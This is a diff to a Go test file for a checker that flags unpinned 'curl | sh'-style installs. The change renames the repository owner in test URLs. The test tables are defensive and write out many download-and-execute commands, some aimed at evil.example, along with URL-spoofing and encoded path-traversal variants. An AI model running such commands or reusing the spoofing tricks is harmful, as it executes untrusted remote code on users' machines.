@@ -8,9 +8,9 @@ import (
 
 const (
 	sha40        = "0123456789abcdef0123456789abcdef01234567"
-	commitPrefix = "https://raw.githubusercontent.com/acme/tools/" + sha40
+	commitPrefix = "https://raw.githubusercontent.com/vgmartinez/tools/" + sha40
 	commitURL    = commitPrefix + "/install.sh"
-	branchURL    = "https://raw.githubusercontent.com/acme/tools/main/install.sh"
+	branchURL    = "https://raw.githubusercontent.com/vgmartinez/tools/main/install.sh"
 	sum          = "abababababababababababababababababababababababababababababababab"
 )
 
@@ -22,17 +22,17 @@ func TestUnpinned(t *testing.T) {
 		// Immutable URLs.
 		{"curl -fsSL " + commitURL + " | sh", nil},
 		{"curl -fsSL '" + commitURL + "?token=x' | bash", nil},
-		{"wget -qO- https://cdn.jsdelivr.net/gh/acme/tools@0123456789abcdef0123456789abcdef01234567/i.sh | sh", nil},
+		{"wget -qO- https://cdn.jsdelivr.net/gh/vgmartinez/tools@0123456789abcdef0123456789abcdef01234567/i.sh | sh", nil},
 		{"curl -fsSL https://registry.example.invalid/v2/tools/blobs/sha256:" + strings.Repeat("ab", 32) + " | sh", []string{Fetch, Pipe}},
 		{"wget -qO- https://registry.example.invalid/v2/tools/manifests/sha256:" + strings.Repeat("ab", 32) + " | sh", []string{Fetch, Pipe}},
 		{"curl -fsSL https://evil.example/" + strings.Repeat("ab", 20) + "/i.sh | sh", []string{Fetch, Pipe}},
-		{"curl -fsSL https://raw.githubusercontent.com@evil.example/acme/tools/" + strings.Repeat("ab", 20) + "/i.sh | sh", []string{Fetch, Pipe}},
-		{"curl -fsSL https://github.com/acme/tools/releases/download/" + strings.Repeat("ab", 20) + "/i.sh | sh", []string{Fetch, Pipe}},
-		{"curl -fsSL https://RAW.GITHUBUSERCONTENT.COM/acme/tools/" + strings.Repeat("ab", 20) + "/i.sh | sh", nil},
-		{"curl -fsSL https://raw.githubusercontent.com./acme/tools/" + strings.Repeat("ab", 20) + "/i.sh | sh", []string{Fetch, Pipe}},
+		{"curl -fsSL https://raw.githubusercontent.com@evil.example/vgmartinez/tools/" + strings.Repeat("ab", 20) + "/i.sh | sh", []string{Fetch, Pipe}},
+		{"curl -fsSL https://github.com/vgmartinez/tools/releases/download/" + strings.Repeat("ab", 20) + "/i.sh | sh", []string{Fetch, Pipe}},
+		{"curl -fsSL https://RAW.GITHUBUSERCONTENT.COM/vgmartinez/tools/" + strings.Repeat("ab", 20) + "/i.sh | sh", nil},
+		{"curl -fsSL https://raw.githubusercontent.com./vgmartinez/tools/" + strings.Repeat("ab", 20) + "/i.sh | sh", []string{Fetch, Pipe}},
 		{"curl -fsSL " + commitPrefix + "/../main/i.sh | sh", []string{Fetch, Pipe}},
-		{"curl -fsSL " + commitPrefix + "/../../../evil/repo/main/i.sh | sh", []string{Fetch, Pipe}},
-		{"curl -fsSL https://github.com/acme/tools/raw/" + sha40 + "/../../../../x/y/raw/main/i.sh | sh", []string{Fetch, Pipe}},
+		{"curl -fsSL " + commitPrefix + "/../../../vgmartinez/repo/main/i.sh | sh", []string{Fetch, Pipe}},
+		{"curl -fsSL https://github.com/vgmartinez/tools/raw/" + sha40 + "/../../../../x/y/raw/main/i.sh | sh", []string{Fetch, Pipe}},
 		{"curl -fsSL " + commitPrefix + "/./../main/i.sh | sh", []string{Fetch, Pipe}},
 		{"curl -fsSL " + commitPrefix + "/%2e%2e/main/i.sh | sh", []string{Fetch, Pipe}},
 		{"curl -fsSL " + commitPrefix + "/%2E%2e/main/i.sh | sh", []string{Fetch, Pipe}},
@@ -43,8 +43,8 @@ func TestUnpinned(t *testing.T) {
 		{"deno run -A " + strings.Replace(commitURL, "install.sh", "mod.ts", 1), nil},
 		{"iex (New-Object Net.WebClient).DownloadString('" + commitURL + "')", nil},
 		{"curl -fsSL " + branchURL + " | sh", []string{Fetch, Pipe}},
-		{"curl -fsSL http://raw.githubusercontent.com/acme/tools/0123456789abcdef0123456789abcdef01234567/install.sh | sh", []string{Fetch, Pipe}},
-		{"curl -fsSL https://github.com/acme/tools/releases/download/v1.2.3/install.sh | sh", []string{Fetch, Pipe}},
+		{"curl -fsSL http://raw.githubusercontent.com/vgmartinez/tools/0123456789abcdef0123456789abcdef01234567/install.sh | sh", []string{Fetch, Pipe}},
+		{"curl -fsSL https://github.com/vgmartinez/tools/releases/download/v1.2.3/install.sh | sh", []string{Fetch, Pipe}},
 		{"curl -fsSL " + commitURL + " | sh; curl -fsSL " + branchURL + " | sh", []string{Fetch, Pipe}},
 		{"curl -fsSL $URL | sh", []string{Pipe}},
 		{"iwr $u | iex", []string{Pipe}},
@@ -122,7 +122,7 @@ func TestUnpinned(t *testing.T) {
 		{"set -o errexit; curl -fsSLo i.sh " + branchURL + "; sha256sum -c s; sh i.sh", nil},
 		{"curl -fsSL " + branchURL + " | tee i.sh | sh && sha256sum -c sums", []string{Fetch, Pipe}},
 		{"npx -y create-acme && sha256sum -c sums.txt", []string{Fetch}},
-		{"git clone https://github.com/acme/tools && make -C tools", []string{Fetch}},
+		{"git clone https://github.com/vgmartinez/tools && make -C tools", []string{Fetch}},
 
 		// No risk.
 		{"npm ci && npm run build", nil},
@@ -166,7 +166,7 @@ func TestUnpinnedArgv(t *testing.T) {
 }
 
 func TestUnpinnedSumsTargets(t *testing.T) {
-	const line = "curl -fsSLo i.sh https://raw.githubusercontent.com/acme/tools/main/install.sh && sha256sum -c s && sh i.sh"
+	const line = "curl -fsSLo i.sh https://raw.githubusercontent.com/vgmartinez/tools/main/install.sh && sha256sum -c s && sh i.sh"
 	if got := UnpinnedSumsTargets(line, Sums{"s": {"i.sh"}}, map[string]bool{"i.sh": true}).Risks; !slices.Equal(got, []string{Fetch}) {
 		t.Fatalf("UnpinnedSumsTargets with a symlink = %q, want fetch", got)
 	}
@@ -178,36 +178,36 @@ func TestUnpinnedSumsTargets(t *testing.T) {
 func TestImmutableURL(t *testing.T) {
 	for url, want := range map[string]bool{
 		commitURL: true,
-		"https://github.com/acme/tools/raw/" + strings.Repeat("a", 64) + "/i.sh":                          true,
-		"https://RAW.GITHUBUSERCONTENT.COM/acme/tools/" + strings.Repeat("a", 40) + "/i.sh":               true,
-		"https://gitlab.com/acme/tools/-/raw/" + strings.Repeat("ab", 20) + "/i.sh":                       true,
-		"https://cdn.jsdelivr.net/gh/acme/tools@" + strings.Repeat("ab", 20) + "/i.sh":                    true,
-		"https://codeload.github.com/acme/tools/tar.gz/" + strings.Repeat("ab", 20):                       true,
-		"https://gist.githubusercontent.com/acme/abcdef/" + "raw/" + strings.Repeat("ab", 20) + "/i.sh":   true,
-		"https://registry.example.invalid/v2/tools/blobs/sha256:" + strings.Repeat("0", 64):               false,
-		"https://gitlab.example.invalid/acme/tools/-/raw/0123456789ABCDEF0123456789abcdef01234567/i.sh":   false,
-		"https://evil.example/" + strings.Repeat("ab", 20) + "/i.sh":                                      false,
-		"https://raw.githubusercontent.com@evil.example/acme/tools/" + strings.Repeat("ab", 20) + "/i.sh": false,
-		"https://user:pw@raw.githubusercontent.com/acme/tools/" + strings.Repeat("ab", 20) + "/i.sh":      false,
-		"https://raw.githubusercontent.com./acme/tools/" + strings.Repeat("ab", 20) + "/i.sh":             false,
-		"https://github.com/acme/tools/releases/download/" + strings.Repeat("ab", 20) + "/i.sh":           false,
-		"https://evil.example/sha256:" + strings.Repeat("0", 64) + "/i.sh":                                false,
-		"http://raw.githubusercontent.com/acme/tools/" + strings.Repeat("ab", 20) + "/i.sh":               false,
-		commitPrefix + "/../main/i.sh":                                                  false,
-		commitPrefix + "/../../../evil/repo/main/i.sh":                                  false,
-		"https://github.com/acme/tools/raw/" + sha40 + "/../../../../x/y/raw/main/i.sh": false,
-		commitPrefix + "/./../main/i.sh":                                                false,
-		commitPrefix + "/%2e%2e/main/i.sh":                                              false,
-		commitPrefix + "/%2E%2E/main/i.sh":                                              false,
-		commitPrefix + "/.%2E/main/i.sh":                                                false,
-		commitPrefix + "/%2e/i.sh":                                                      false,
-		commitPrefix + "/%zz/i.sh":                                                      false,
-		branchURL:                                                                       false,
-		"https://example.invalid/i.sh?ref=0123456789abcdef0123456789abcdef01234567":     false,
-		"https://example.invalid/0123456789abcdef0123456789abcdef0123456/i.sh":          false,
-		"https://example.invalid/sha256:" + strings.Repeat("0", 63):                     false,
-		"ftp://example.invalid/0123456789abcdef0123456789abcdef01234567/i.sh":           false,
-		"https:///0123456789abcdef0123456789abcdef01234567":                             false,
+		"https://github.com/vgmartinez/tools/raw/" + strings.Repeat("a", 64) + "/i.sh":                          true,
+		"https://RAW.GITHUBUSERCONTENT.COM/vgmartinez/tools/" + strings.Repeat("a", 40) + "/i.sh":               true,
+		"https://gitlab.com/vgmartinez/tools/-/raw/" + strings.Repeat("ab", 20) + "/i.sh":                       true,
+		"https://cdn.jsdelivr.net/gh/vgmartinez/tools@" + strings.Repeat("ab", 20) + "/i.sh":                    true,
+		"https://codeload.github.com/vgmartinez/tools/tar.gz/" + strings.Repeat("ab", 20):                       true,
+		"https://gist.githubusercontent.com/vgmartinez/abcdef/" + "raw/" + strings.Repeat("ab", 20) + "/i.sh":   true,
+		"https://registry.example.invalid/v2/tools/blobs/sha256:" + strings.Repeat("0", 64):                     false,
+		"https://gitlab.example.invalid/vgmartinez/tools/-/raw/0123456789ABCDEF0123456789abcdef01234567/i.sh":   false,
+		"https://evil.example/" + strings.Repeat("ab", 20) + "/i.sh":                                            false,
+		"https://raw.githubusercontent.com@evil.example/vgmartinez/tools/" + strings.Repeat("ab", 20) + "/i.sh": false,
+		"https://user:pw@raw.githubusercontent.com/vgmartinez/tools/" + strings.Repeat("ab", 20) + "/i.sh":      false,
+		"https://raw.githubusercontent.com./vgmartinez/tools/" + strings.Repeat("ab", 20) + "/i.sh":             false,
+		"https://github.com/vgmartinez/tools/releases/download/" + strings.Repeat("ab", 20) + "/i.sh":           false,
+		"https://evil.example/sha256:" + strings.Repeat("0", 64) + "/i.sh":                                      false,
+		"http://raw.githubusercontent.com/vgmartinez/tools/" + strings.Repeat("ab", 20) + "/i.sh":               false,
+		commitPrefix + "/../main/i.sh":                                                        false,
+		commitPrefix + "/../../../vgmartinez/repo/main/i.sh":                                  false,
+		"https://github.com/vgmartinez/tools/raw/" + sha40 + "/../../../../x/y/raw/main/i.sh": false,
+		commitPrefix + "/./../main/i.sh":                                                      false,
+		commitPrefix + "/%2e%2e/main/i.sh":                                                    false,
+		commitPrefix + "/%2E%2E/main/i.sh":                                                    false,
+		commitPrefix + "/.%2E/main/i.sh":                                                      false,
+		commitPrefix + "/%2e/i.sh":                                                            false,
+		commitPrefix + "/%zz/i.sh":                                                            false,
+		branchURL:                                                                             false,
+		"https://example.invalid/i.sh?ref=0123456789abcdef0123456789abcdef01234567":           false,
+		"https://example.invalid/0123456789abcdef0123456789abcdef0123456/i.sh":                false,
+		"https://example.invalid/sha256:" + strings.Repeat("0", 63):                           false,
+		"ftp://example.invalid/0123456789abcdef0123456789abcdef01234567/i.sh":                 false,
+		"https:///0123456789abcdef0123456789abcdef01234567":                                   false,
 		"%zz": false,
 	} {
 		if got := immutableURL(url); got != want {
